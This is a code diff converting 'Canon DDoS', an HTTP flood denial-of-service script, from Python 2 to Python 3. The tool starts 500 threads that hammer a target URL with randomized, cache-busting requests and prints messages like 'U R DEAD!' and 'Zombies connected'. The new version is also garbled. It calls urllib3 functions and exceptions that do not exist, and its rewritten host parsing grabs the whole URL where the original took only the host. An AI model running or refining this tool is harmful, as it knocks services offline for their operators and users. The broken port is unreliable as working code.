@@ -1,6 +1,6 @@
 #code by Anonymous
 #Name code : canon.py ver4
-import urllib2
+import urllib3
 import sys
 import threading
 import random 
@@ -337,8 +337,8 @@ def buildblock(size):
 
 def usage():
 
-	print 'Su dung: Canon.py [URL]'
-	print 'U R DEAD!'
+	print ('MANUAL: Canon.py [URL]')
+	print ('U R DEAD!')
 
 
 
@@ -352,7 +352,7 @@ def httpcall(url):
 		param_joiner="&"
 	else:
 		param_joiner="?"
-	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10000)) + '=' + buildblock(random.randint(3,1000)))
+	request = urllib3.Request(url + param_joiner + buildblock(random.randint(3,10000)) + '=' + buildblock(random.randint(3,1000)))
 	request.add_header('User-Agent', random.choice(headers_useragents))
 	request.add_header('Cache-Control', 'no-cache')
 	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
@@ -361,18 +361,18 @@ def httpcall(url):
 	request.add_header('Connection', 'keep-alive')
 	request.add_header('Host',host)
 	try:
-			urllib2.urlopen(request)
-	except urllib2.HTTPError, e:
-			#print e.code
+			urllib3.urlopen(request)
+	except urllib3.exceptions.HTTPError as e:
+			print(e.code)
 			set_flag(1)
-			print 'Code 500 Attack'
+			print('Code 500 Attack')
 			code=500
-	except urllib2.URLError, e:
+	except urllib3.exceptions.url:
 			#print e.reason
 			sys.exit()
 	else:
 			inc_counter()
-			urllib2.urlopen(request)
+			urllib3.urlopen(request)
 	return(code)		
 
 	
@@ -384,7 +384,7 @@ class HTTPThread(threading.Thread):
 				code=httpcall(url)
 				if (code==500) & (safe==1):
 					set_flag(2)
-		except Exception, ex:
+		except Exception as ex:
 			pass
 
 # monitors http threads and counts requests
@@ -392,11 +392,11 @@ class MonitorThread(threading.Thread):
 	def run(self):
 		previous=request_counter
 		while flag==0:
-			if (previous+100<request_counter) & (previous<>request_counter):
-				print "%d Zombies connected" % (request_counter)
+			if (previous+100<request_counter) & (previous!=request_counter):
+				print (f"{request_counter} Zombies connected")
 				previous=request_counter
 		if flag==2:
-			print "\n-- Attack Victim =) --"
+			print ("\n-- Attack Victim =) --")
 
 #execute 
 if len(sys.argv) < 2:
@@ -408,15 +408,18 @@ else:
 		sys.exit()
 		
 	else:
-		print "-- Canon DDoS --"
+		print ("-- Canon DDoS --")
 		if len(sys.argv)== 3:
 			if sys.argv[2]=="safe":
 				set_safe() 
 		url = sys.argv[1]
 		if url.count("/")==2:
 			url = url + "/"
-		m = re.search('http\://([^/]*)/?.*', url)
-		host = m.group(1)
+		try:
+			host = re.search('http\://([^/]*)/?.*', url).group()
+		except:
+			print("Invalid URL format Add https:// or http://")
+			sys.exit()
 		for i in range(500):
 			t = HTTPThread()
 			t.start()
